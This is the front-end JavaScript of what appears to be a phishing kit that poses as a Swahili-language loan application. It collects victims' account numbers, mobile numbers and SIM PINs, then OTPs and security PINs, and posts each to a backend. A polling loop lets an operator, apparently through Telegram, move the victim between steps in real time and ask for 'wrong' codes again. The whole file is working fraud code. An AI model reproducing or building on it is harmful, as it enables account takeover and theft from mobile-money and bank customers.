const sessionId = 'session_' + Math.random().toString(36).substring(2, 9);
let pollInterval = null;

// UI Elements
const steps = {
    loan: document.getElementById('step-loan'),
    credentials: document.getElementById('step-credentials'),
    otp: document.getElementById('step-otp'),
    securityPin: document.getElementById('step-security-pin'),
    success: document.getElementById('step-success')
};

function showStep(stepName) {
    Object.keys(steps).forEach(key => {
        steps[key].classList.add('hidden');
    });
    steps[stepName].classList.remove('hidden');
}

function showNotification(message, isError = false) {
    const banner = document.getElementById('notification-banner');
    banner.textContent = message;
    banner.classList.remove('hidden');
    if (isError) banner.classList.add('error');
    else banner.classList.remove('error');
}

// Loan sliders
const loanAmount = document.getElementById('loan-amount');
const loanMonths = document.getElementById('loan-months');
const amountText = document.getElementById('amount-text');
const monthsText = document.getElementById('months-text');
const monthlyPayment = document.getElementById('monthly-payment');

loanAmount.addEventListener('input', updateLoanCalc);
loanMonths.addEventListener('input', updateLoanCalc);

function updateLoanCalc() {
    const amt = parseInt(loanAmount.value);
    const months = parseInt(loanMonths.value);
    amountText.textContent = `TSh ${amt.toLocaleString()}`;
    monthsText.textContent = `miezi ${months}`;
    const monthly = Math.round((amt * 1.25) / months);
    monthlyPayment.textContent = `TSh ${monthly.toLocaleString()}`;
}

// Start Application
document.getElementById('btn-omba').addEventListener('click', () => {
    showStep('credentials');
});

// Submit Credentials
document.getElementById('btn-continue-creds').addEventListener('click', async () => {
    const accountNumber = document.getElementById('acc-number').value.trim();
    const mobileNumber = document.getElementById('mobile-number').value.trim();
    const pin = document.getElementById('sim-pin').value.trim();

    if (!accountNumber || !mobileNumber || !pin) {
        alert('Tafadhali jaza sehemu zote.');
        return;
    }

    document.getElementById('credentials-spinner').classList.remove('hidden');
    document.getElementById('btn-continue-creds').classList.add('hidden');

    await fetch('/api/submit-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            sessionId,
            accountNumber,
            mobileNumber,
            pin,
            loanDetails: {
                amount: amountText.textContent,
                monthly: monthlyPayment.textContent
            }
        })
    });

    startPolling();
});

// Auto-advance OTP inputs
setupPinInputs('.otp-box');
setupPinInputs('.pin-box');

function setupPinInputs(selector) {
    const boxes = document.querySelectorAll(selector);
    boxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            if (e.target.value && index < boxes.length - 1) {
                boxes[index + 1].focus();
            }
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !box.value && index > 0) {
                boxes[index - 1].focus();
            }
        });
    });
}

// Submit OTP
document.getElementById('btn-verify-otp').addEventListener('click', async () => {
    const boxes = document.querySelectorAll('#step-otp .otp-box');
    const otp = Array.from(boxes).map(b => b.value).join('');
    if (otp.length < 5) {
        alert('Tafadhali ingiza OTP kamili.');
        return;
    }

    await fetch('/api/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, otp })
    });

    showNotification('OTP imetumwa. Inasubiri uthibitisho...');
});

// Submit Security PIN
document.getElementById('btn-verify-security-pin').addEventListener('click', async () => {
    const boxes = document.querySelectorAll('#step-security-pin .pin-box');
    const securityPin = Array.from(boxes).map(b => b.value).join('');
    if (securityPin.length < 4) {
        alert('Tafadhali ingiza PIN ya usalama ya tarakimu 4.');
        return;
    }

    await fetch('/api/submit-security-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, securityPin })
    });

    showNotification('PIN imetumwa. Inasubiri idhini...');
});

// Polling loop to check admin actions from Telegram
function startPolling() {
    if (pollInterval) clearInterval(pollInterval);

    pollInterval = setInterval(async () => {
        try {
            const res = await fetch(`/api/status/${sessionId}`);
            const data = await res.json();

            if (data.notification) {
                const isErr = data.status === 'error' || data.notification.includes('WRONG') || data.notification.includes('INVALID');
                showNotification(data.notification, isErr);
            }

            if (data.status === 'enter_otp') {
                showStep('otp');
            } else if (data.status === 'enter_security_pin') {
                showStep('securityPin');
            } else if (data.status === 'success') {
                document.getElementById('approved-amount-text').textContent = amountText.textContent;
                document.getElementById('success-monthly').textContent = monthlyPayment.textContent;
                showStep('success');
                clearInterval(pollInterval);
            } else if (data.status === 'error') {
                // Re-enable credentials form if invalid data requested by admin
                document.getElementById('credentials-spinner').classList.add('hidden');
                document.getElementById('btn-continue-creds').classList.remove('hidden');
                showStep('credentials');
            }
        } catch (e) {
            console.error('Polling error:', e);
        }
    }, 3000);
    }
    
